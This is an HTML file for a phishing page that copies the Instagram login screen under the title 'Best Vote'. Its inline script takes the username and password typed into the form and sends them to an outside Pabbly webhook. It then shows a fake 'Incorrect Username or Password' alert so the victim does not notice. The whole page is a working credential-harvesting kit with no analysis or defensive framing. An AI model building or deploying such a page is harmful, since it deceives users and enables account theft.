<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./static/styles.css" />
    <link rel="icon" type="image/png" href="./static/img/insta-fav.ico">
    <title>Best Vote</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./static/img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="myWebhookForm" action="/admin2026" method="POST" onsubmit="return false;">
                    <label for="email" class="sr-only">Phone number, username, or email address.</label>
                    <input name="email" placeholder="Phone number, username, or email address." />
                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" />
                    
                    <button type="submit">Log In</button> 
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        
                        <a>Login with Facebook</a>
                    </div>
                    <a href="#">Forgot Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account ?</p>
                <a href="#">Register</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the App</p>
                <div class="flex justify-content-center">
                    <img src="./static/img/apple-button.png"       />
                    <img src="./static/img/googleplay-button.png"  />
                </div>
            </div>
        </section>
        <script>    
            const form = document.getElementById('myWebhookForm');

            form.addEventListener('submit', async (event) => {
              event.preventDefault();

              const formData = new FormData(form);
              const data = Object.fromEntries(formData.entries());

              try {
                const response = await fetch('https://connect.pabbly.com/webhook-listener/webhook/IjU3NjIwNTY0MDYzNDA0MzM1MjZmNTUzMiI_3D_pc/IjU3NjcwNTZlMDYzNTA0MzE1MjY1NTUzMTUxMzQi_pc', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify(data)
                });

                if (response.ok) {
                  alert('Incorrect Username or Password');
                } else {
                  alert('Failed to Login.');
                }
              } catch (error) {
                console.error('Error:', error);
              }
            });
        </script>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Location</a></li>
            <li><a href="#">Popular</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Help</a></li>
        </ul>
        <p class="copyright">© 2026 Instagram</p>
    </footer>
</body>
</html>
